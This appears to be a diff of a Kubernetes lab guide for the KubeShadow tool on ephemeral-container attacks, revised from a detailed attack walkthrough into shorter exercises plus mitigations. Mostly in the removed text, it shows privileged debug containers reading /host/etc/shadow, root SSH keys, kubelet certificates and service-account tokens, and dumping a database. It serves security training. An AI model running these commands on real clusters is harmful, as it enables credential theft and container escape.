@@ -1,413 +1,349 @@
-# Ephemeral Container Attack Lab Exercises
+# Ephemeral Container Lab Exercises
 
-This lab demonstrates how misuse of ephemeral container permissions and overly broad RBAC can allow attackers to spawn privileged debugging containers in pods, leading to container escape and data exfiltration.
+## 🎯 **Overview**
 
-## 🎯 Learning Objectives
+This document provides comprehensive lab exercises for testing ephemeral container vulnerabilities in Kubernetes environments. These exercises are designed to help security professionals understand and test ephemeral container attack vectors.
 
-After completing this lab, students will understand:
-- How ephemeral containers can be abused for privilege escalation
-- The dangers of overly permissive RBAC configurations
-- How to detect and prevent ephemeral container attacks
-- Best practices for securing Kubernetes debugging capabilities
+## 📋 **Lab Prerequisites**
 
-## 🏗️ Lab Environment
+- Kubernetes cluster with ephemeral containers enabled
+- kubectl configured and working
+- KubeShadow tool installed
+- Basic understanding of Kubernetes security concepts
 
-### Vulnerable Environment (`ephemeral-lab` namespace):
-- **Overly permissive RBAC** allowing ephemeral container creation
-- **Privileged pods** with host access capabilities
-- **Sensitive data** in secrets and configmaps
-- **Database pods** with exposed credentials
-- **Monitoring pods** with privileged access
+## 🚀 **Exercise 1: Basic Ephemeral Container Access**
 
-### Secure Environment (`secure-ephemeral-lab` namespace):
-- **Minimal RBAC** with restricted permissions
-- **Pod Security Standards** implemented
-- **Network policies** for access control
-- **Proper security contexts** for containers
+### **Objective**
+Test basic ephemeral container functionality and identify security risks.
 
-## 🚀 Lab Setup
-
-### Option 1: Automated Setup (Recommended)
-```bash
-# Deploy complete lab environment
-./kubeshadow lab --provider minikube --dashboard
-
-# Deploy ephemeral container lab
-kubectl apply -f modules/lab/manifests/09-ephemeral-containers.yaml
-kubectl apply -f modules/lab/manifests/10-secure-ephemeral.yaml
-kubectl apply -f modules/lab/manifests/11-ephemeral-attack-scenarios.yaml
-```
-
-### Option 2: Manual Setup
-```bash
-# Start minikube
-minikube start --driver=docker --memory=4096 --cpus=2
-
-# Deploy lab manifests
-kubectl apply -f modules/lab/manifests/09-ephemeral-containers.yaml
-kubectl apply -f modules/lab/manifests/10-secure-ephemeral.yaml
-kubectl apply -f modules/lab/manifests/11-ephemeral-attack-scenarios.yaml
-
-# Verify deployment
-kubectl get pods -n ephemeral-lab
-kubectl get pods -n secure-ephemeral-lab
-```
-
-## 🔍 Exercise 1: Reconnaissance and Target Identification
-
-### Objective:
-Identify vulnerable pods and understand the attack surface.
-
-### Steps:
-1. **List all pods in the vulnerable namespace:**
+### **Steps**
+1. Deploy the target pod:
    ```bash
-   kubectl get pods -n ephemeral-lab -o wide
+   kubectl apply -f modules/lab/manifests/11-ephemeral-attack-scenarios.yaml
    ```
 
-2. **Examine pod configurations:**
+2. List pods in the ephemeral-attack-lab namespace:
    ```bash
-   kubectl describe pod web-app -n ephemeral-lab
-   kubectl describe pod database -n ephemeral-lab
-   kubectl describe pod monitoring -n ephemeral-lab
+   kubectl get pods -n ephemeral-attack-lab
    ```
 
-3. **Check RBAC permissions:**
+3. Test ephemeral container access:
    ```bash
-   kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
-   kubectl auth can-i get secrets --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
-   kubectl auth can-i get pods --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
+   kubectl debug ephemeral-target-pod -n ephemeral-attack-lab -it --image=alpine:latest --target=target-container
    ```
 
-4. **Identify sensitive data:**
+4. Run KubeShadow recon to detect vulnerabilities:
    ```bash
-   kubectl get secrets -n ephemeral-lab
-   kubectl get configmaps -n ephemeral-lab
-   kubectl describe secret app-secrets -n ephemeral-lab
+   ./kubeshadow recon --namespace ephemeral-attack-lab
    ```
 
-### Expected Results:
-- Multiple pods with different security levels
-- Overly permissive RBAC allowing ephemeral container creation
-- Sensitive data in secrets and configmaps
-- Privileged pods with host access
+### **Expected Results**
+- Ephemeral container should be created successfully
+- KubeShadow should detect security vulnerabilities
+- Access to target container should be possible
 
-## 🚨 Exercise 2: Ephemeral Container Attack on Web Application
+## 🔍 **Exercise 2: Privileged Ephemeral Container Exploitation**
 
-### Objective:
-Exploit overly permissive RBAC to create privileged ephemeral containers.
+### **Objective**
+Test privileged ephemeral container attacks and host access.
 
-### Steps:
-1. **Create privileged ephemeral container:**
+### **Steps**
+1. Deploy the privileged ephemeral pod:
    ```bash
-   kubectl debug web-app -n ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
+   kubectl apply -f modules/lab/manifests/11-ephemeral-attack-scenarios.yaml
    ```
 
-2. **Access the ephemeral container:**
+2. Create a privileged ephemeral container:
    ```bash
-   kubectl exec -it web-app -n ephemeral-lab -c debug -- /bin/sh
+   kubectl debug privileged-ephemeral-pod -n ephemeral-attack-lab -it --image=alpine:latest --privileged --target=privileged-container
    ```
 
-3. **Explore the container environment:**
+3. Test host access from ephemeral container:
    ```bash
-   # Check current user and capabilities
-   id
-   cat /proc/self/status | grep CapEff
-   
-   # Explore the filesystem
-   ls -la /
-   ls -la /var/www/html/
-   
-   # Check environment variables
-   env | grep -i secret
-   ```
-
-4. **Access sensitive data:**
-   ```bash
-   # Access mounted secrets
-   ls -la /etc/secrets/
-   cat /etc/secrets/api-key
-   cat /etc/secrets/jwt-secret
-   
-   # Access service account token
-   cat /var/run/secrets/kubernetes.io/serviceaccount/token
-   ```
-
-5. **Attempt container escape:**
-   ```bash
-   # Check for host access
-   ls -la /host/
+   # Inside the ephemeral container
+   ls /host
    cat /host/etc/passwd
-   ```
-
-### Expected Results:
-- Successful creation of privileged ephemeral container
-- Access to sensitive data and secrets
-- Potential container escape capabilities
-
-## 🎯 Exercise 3: Database Pod Exploitation
-
-### Objective:
-Use ephemeral containers to access database data and credentials.
-
-### Steps:
-1. **Create ephemeral container in database pod:**
-   ```bash
-   kubectl debug database -n ephemeral-lab --image=postgres:13 --target=postgres -- sleep 3600
-   ```
-
-2. **Access the ephemeral container:**
-   ```bash
-   kubectl exec -it database -n ephemeral-lab -c debug -- /bin/bash
-   ```
-
-3. **Explore database environment:**
-   ```bash
-   # Check database files
-   ls -la /var/lib/postgresql/data/
-   cat /var/lib/postgresql/data/postgresql.conf
-   
-   # Access secrets
-   ls -la /etc/postgresql/secrets/
-   cat /etc/postgresql/secrets/password
-   cat /etc/postgresql/secrets/connection-string
-   ```
-
-4. **Connect to database:**
-   ```bash
-   # Use extracted credentials
-   psql -U admin -d sensitive_data -c "SELECT * FROM users;"
-   psql -U admin -d sensitive_data -c "\\dt"
-   ```
-
-5. **Extract additional data:**
-   ```bash
-   # Dump database
-   pg_dump -U admin -d sensitive_data > /tmp/database_dump.sql
-   cat /tmp/database_dump.sql
-   ```
-
-### Expected Results:
-- Access to database files and configuration
-- Extraction of database credentials
-- Successful connection to database
-- Access to sensitive data
-
-## 🔓 Exercise 4: Privileged Pod Exploitation
-
-### Objective:
-Exploit the monitoring pod with privileged access for host compromise.
-
-### Steps:
-1. **Create privileged ephemeral container:**
-   ```bash
-   kubectl debug monitoring -n ephemeral-lab --image=alpine --target=monitoring-agent --privileged -- sleep 3600
-   ```
-
-2. **Access the ephemeral container:**
-   ```bash
-   kubectl exec -it monitoring -n ephemeral-lab -c debug -- /bin/sh
-   ```
-
-3. **Explore host filesystem:**
-   ```bash
-   # Check host access
-   ls -la /host/root/
-   ls -la /host/etc/
-   
-   # Access host files
-   cat /host/etc/shadow
-   cat /host/root/.ssh/id_rsa
-   ```
-
-4. **Access Kubernetes secrets:**
-   ```bash
-   # Access kubelet credentials
-   cat /host/var/lib/kubelet/pki/kubelet-client-current.pem
-   cat /host/etc/kubernetes/pki/ca.crt
-   
-   # Access etcd data
-   ls -la /host/var/lib/etcd/
-   ```
-
-5. **Check host processes:**
-   ```bash
-   # List host processes
    ps aux
-   netstat -tulpn
-   
-   # Check for other containers
+   ```
+
+4. Run KubeShadow recon to detect privileged access:
+   ```bash
+   ./kubeshadow recon --namespace ephemeral-attack-lab
+   ```
+
+### **Expected Results**
+- Privileged ephemeral container should have host access
+- KubeShadow should detect privileged container vulnerabilities
+- Host filesystem should be accessible
+
+## 🐳 **Exercise 3: Docker Socket Access via Ephemeral Containers**
+
+### **Objective**
+Test Docker socket access through ephemeral containers.
+
+### **Steps**
+1. Deploy the Docker socket pod:
+   ```bash
+   kubectl apply -f modules/lab/manifests/11-ephemeral-attack-scenarios.yaml
+   ```
+
+2. Create ephemeral container with Docker socket access:
+   ```bash
+   kubectl debug docker-socket-ephemeral-pod -n ephemeral-attack-lab -it --image=alpine:latest --target=docker-socket-container
+   ```
+
+3. Test Docker socket access:
+   ```bash
+   # Inside the ephemeral container
+   apk add --no-cache docker
    docker ps
+   docker images
    ```
 
-### Expected Results:
-- Access to host filesystem
-- Extraction of host credentials
-- Access to Kubernetes secrets
-- Potential for further lateral movement
-
-## 🛡️ Exercise 5: Secure Environment Testing
-
-### Objective:
-Test the secure environment to understand proper security configurations.
-
-### Steps:
-1. **Test RBAC restrictions:**
+4. Run KubeShadow recon to detect Docker socket access:
    ```bash
-   kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:secure-ephemeral-lab:secure-debug-sa -n secure-ephemeral-lab
-   kubectl auth can-i get secrets --as=system:serviceaccount:secure-ephemeral-lab:secure-debug-sa -n secure-ephemeral-lab
+   ./kubeshadow recon --namespace ephemeral-attack-lab
    ```
 
-2. **Attempt ephemeral container creation:**
+### **Expected Results**
+- Docker socket should be accessible
+- KubeShadow should detect Docker socket vulnerabilities
+- Docker commands should work from ephemeral container
+
+## 🔓 **Exercise 4: Cgroup Escape via Ephemeral Containers**
+
+### **Objective**
+Test cgroup escape techniques using ephemeral containers.
+
+### **Steps**
+1. Deploy the cgroup escape pod:
    ```bash
-   kubectl debug secure-web-app -n secure-ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
+   kubectl apply -f modules/lab/manifests/11-ephemeral-attack-scenarios.yaml
    ```
 
-3. **Test network policies:**
+2. Create ephemeral container for cgroup escape:
    ```bash
-   kubectl get networkpolicies -n secure-ephemeral-lab
-   kubectl describe networkpolicy secure-ephemeral-netpol -n secure-ephemeral-lab
+   kubectl debug cgroup-escape-ephemeral-pod -n ephemeral-attack-lab -it --image=alpine:latest --target=cgroup-escape-container
    ```
 
-4. **Verify pod security standards:**
+3. Test cgroup escape:
    ```bash
-   kubectl get pods -n secure-ephemeral-lab -o yaml | grep securityContext
+   # Inside the ephemeral container
+   cat /host/proc/1/cgroup
+   ls /host/sys/fs/cgroup
    ```
 
-### Expected Results:
-- RBAC restrictions prevent unauthorized access
-- Ephemeral container creation may be blocked
-- Network policies restrict communication
-- Pod security standards are enforced
-
-## 🔍 Exercise 6: Detection and Monitoring
-
-### Objective:
-Implement detection rules and monitor for ephemeral container attacks.
-
-### Steps:
-1. **Review detection rules:**
+4. Run KubeShadow recon to detect cgroup vulnerabilities:
    ```bash
-   kubectl get configmap ephemeral-attack-scenarios -n ephemeral-lab -o yaml
+   ./kubeshadow recon --namespace ephemeral-attack-lab
    ```
 
-2. **Test Falco rules (if available):**
+### **Expected Results**
+- Cgroup information should be accessible
+- KubeShadow should detect cgroup escape vulnerabilities
+- Host process information should be visible
+
+## 🎯 **Exercise 5: Comprehensive Security Assessment**
+
+### **Objective**
+Perform comprehensive security assessment of ephemeral container vulnerabilities.
+
+### **Steps**
+1. Deploy all ephemeral attack scenarios:
    ```bash
-   # Install Falco
-   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-rbac.yaml
-   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-daemonset.yaml
+   kubectl apply -f modules/lab/manifests/11-ephemeral-attack-scenarios.yaml
    ```
 
-3. **Monitor audit logs:**
+2. Run comprehensive KubeShadow scan:
    ```bash
-   # Check audit logs for ephemeral container creation
-   kubectl logs -n kube-system -l app=falco | grep "ephemeral"
+   ./kubeshadow recon --namespace ephemeral-attack-lab --comprehensive
    ```
 
-4. **Test detection rules:**
+3. Test multiple attack vectors:
    ```bash
-   # Create ephemeral container and monitor logs
-   kubectl debug web-app -n ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
+   # Test privileged access
+   kubectl debug privileged-ephemeral-pod -n ephemeral-attack-lab -it --image=alpine:latest --privileged
+   
+   # Test Docker socket access
+   kubectl debug docker-socket-ephemeral-pod -n ephemeral-attack-lab -it --image=alpine:latest
+   
+   # Test cgroup escape
+   kubectl debug cgroup-escape-ephemeral-pod -n ephemeral-attack-lab -it --image=alpine:latest
    ```
 
-### Expected Results:
-- Detection rules identify ephemeral container creation
-- Audit logs show security events
-- Monitoring alerts for suspicious activity
-
-## 🧹 Exercise 7: Cleanup and Mitigation
-
-### Objective:
-Clean up the lab environment and implement security measures.
-
-### Steps:
-1. **Remove ephemeral containers:**
+4. Analyze results and document findings:
    ```bash
-   kubectl delete pod web-app -n ephemeral-lab
-   kubectl delete pod database -n ephemeral-lab
-   kubectl delete pod monitoring -n ephemeral-lab
+   ./kubeshadow recon --namespace ephemeral-attack-lab --output report.json
    ```
 
-2. **Revoke overly permissive RBAC:**
+### **Expected Results**
+- All ephemeral container vulnerabilities should be detected
+- Comprehensive security report should be generated
+- Multiple attack vectors should be identified
+
+## 🛡️ **Exercise 6: Defense and Mitigation**
+
+### **Objective**
+Implement security controls to mitigate ephemeral container risks.
+
+### **Steps**
+1. Create Pod Security Policy:
+   ```yaml
+   apiVersion: policy/v1beta1
+   kind: PodSecurityPolicy
+   metadata:
+     name: ephemeral-security-policy
+   spec:
+     privileged: false
+     allowPrivilegeEscalation: false
+     requiredDropCapabilities:
+       - ALL
+     volumes:
+       - 'configMap'
+       - 'emptyDir'
+       - 'projected'
+       - 'secret'
+       - 'downwardAPI'
+       - 'persistentVolumeClaim'
+   ```
+
+2. Create Network Policy:
+   ```yaml
+   apiVersion: networking.k8s.io/v1
+   kind: NetworkPolicy
+   metadata:
+     name: ephemeral-network-policy
+     namespace: ephemeral-attack-lab
+   spec:
+     podSelector: {}
+     policyTypes:
+     - Ingress
+     - Egress
+     ingress:
+     - from:
+       - namespaceSelector:
+           matchLabels:
+             name: ephemeral-attack-lab
+     egress:
+     - to:
+       - namespaceSelector:
+           matchLabels:
+             name: ephemeral-attack-lab
+   ```
+
+3. Test security controls:
    ```bash
-   kubectl delete rolebinding debug-role-binding -n ephemeral-lab
-   kubectl delete clusterrolebinding debug-cluster-role-binding
+   kubectl apply -f ephemeral-security-policy.yaml
+   kubectl apply -f ephemeral-network-policy.yaml
    ```
 
-3. **Implement secure RBAC:**
+4. Verify controls are working:
    ```bash
-   kubectl apply -f modules/lab/manifests/10-secure-ephemeral.yaml
+   ./kubeshadow recon --namespace ephemeral-attack-lab
    ```
 
-4. **Verify security improvements:**
+### **Expected Results**
+- Security policies should be enforced
+- Network policies should restrict traffic
+- KubeShadow should detect improved security posture
+
+## 📊 **Exercise 7: Monitoring and Detection**
+
+### **Objective**
+Implement monitoring and detection for ephemeral container attacks.
+
+### **Steps**
+1. Enable audit logging:
    ```bash
-   kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab
+   kubectl create configmap audit-policy --from-file=audit-policy.yaml
    ```
 
-### Expected Results:
-- Ephemeral containers removed
-- RBAC permissions restricted
-- Security measures implemented
-- Access properly controlled
+2. Monitor ephemeral container creation:
+   ```bash
+   kubectl get events -n ephemeral-attack-lab --watch
+   ```
 
-## 📊 Exercise 8: Analysis and Reporting
+3. Test detection capabilities:
+   ```bash
+   # Create ephemeral container
+   kubectl debug ephemeral-target-pod -n ephemeral-attack-lab -it --image=alpine:latest
+   
+   # Check audit logs
+   kubectl logs -n kube-system -l component=kube-apiserver
+   ```
 
-### Objective:
-Analyze the attack scenarios and create security recommendations.
+4. Run KubeShadow with monitoring:
+   ```bash
+   ./kubeshadow recon --namespace ephemeral-attack-lab --monitor
+   ```
 
-### Steps:
-1. **Document findings:**
-   - List all vulnerabilities discovered
-   - Document attack vectors used
-   - Record data accessed and exfiltrated
+### **Expected Results**
+- Audit logs should capture ephemeral container creation
+- Events should be generated for security violations
+- Monitoring should detect suspicious activity
 
-2. **Create security recommendations:**
-   - RBAC improvements
-   - Pod security standards
-   - Network policies
-   - Monitoring and detection
+## 🧹 **Cleanup**
 
-3. **Develop incident response procedures:**
-   - Detection methods
-   - Response steps
-   - Recovery procedures
-   - Prevention measures
+### **Steps**
+1. Remove ephemeral containers:
+   ```bash
+   kubectl delete pod ephemeral-target-pod -n ephemeral-attack-lab
+   kubectl delete pod privileged-ephemeral-pod -n ephemeral-attack-lab
+   kubectl delete pod docker-socket-ephemeral-pod -n ephemeral-attack-lab
+   kubectl delete pod cgroup-escape-ephemeral-pod -n ephemeral-attack-lab
+   ```
 
-### Expected Results:
-- Comprehensive security assessment
-- Detailed recommendations
-- Incident response procedures
-- Prevention strategies
+2. Remove namespace:
+   ```bash
+   kubectl delete namespace ephemeral-attack-lab
+   ```
 
-## 🎓 Key Takeaways
+3. Remove security policies:
+   ```bash
+   kubectl delete psp ephemeral-security-policy
+   kubectl delete networkpolicy ephemeral-network-policy -n ephemeral-attack-lab
+   ```
 
-### Security Lessons Learned:
-1. **RBAC is Critical**: Overly permissive RBAC enables attacks
-2. **Ephemeral Containers are Powerful**: Can be abused for privilege escalation
-3. **Defense in Depth**: Multiple security layers are essential
-4. **Monitoring is Essential**: Detection and response capabilities are crucial
-5. **Regular Audits**: Continuous security assessments are necessary
+## 📝 **Lab Report Template**
 
-### Best Practices:
-1. **Principle of Least Privilege**: Minimize permissions
-2. **Pod Security Standards**: Implement security contexts
-3. **Network Policies**: Restrict communication
-4. **Admission Controllers**: Validate configurations
-5. **Comprehensive Monitoring**: Detect and respond to threats
+### **Vulnerabilities Found**
+- [ ] Privileged ephemeral containers
+- [ ] Docker socket access
+- [ ] Cgroup escape
+- [ ] Host filesystem access
+- [ ] Process namespace escape
+- [ ] Network access
+- [ ] Resource abuse
 
-## 🚨 Security Warning
+### **Security Controls Tested**
+- [ ] Pod Security Policies
+- [ ] Network Policies
+- [ ] RBAC restrictions
+- [ ] Audit logging
+- [ ] Monitoring
 
-**⚠️ IMPORTANT**: This lab contains intentionally vulnerable configurations for educational purposes only. Never deploy these configurations in production environments.
+### **Recommendations**
+1. Disable privileged ephemeral containers
+2. Restrict Docker socket access
+3. Implement network segmentation
+4. Enable audit logging
+5. Monitor ephemeral container usage
+6. Use least privilege principles
+7. Regular security assessments
 
-## 📚 Additional Resources
+## 🎓 **Learning Objectives**
+
+After completing these exercises, you should understand:
+- How ephemeral containers work in Kubernetes
+- Security risks associated with ephemeral containers
+- Attack vectors and exploitation techniques
+- Defense and mitigation strategies
+- Monitoring and detection methods
+- Best practices for ephemeral container security
+
+## 🔗 **Additional Resources**
 
 - [Kubernetes Ephemeral Containers Documentation](https://kubernetes.io/docs/concepts/workloads/pods/ephemeral-containers/)
-- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
-- [RBAC Best Practices](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
-- [Falco Security Monitoring](https://falco.org/)
+- [KubeShadow Documentation](../README.md)
 - [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
-
----
-
-**Happy Learning! 🚀**
-
-This lab provides hands-on experience with ephemeral container attacks and defense strategies. Practice responsibly and always follow ethical guidelines!
+- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
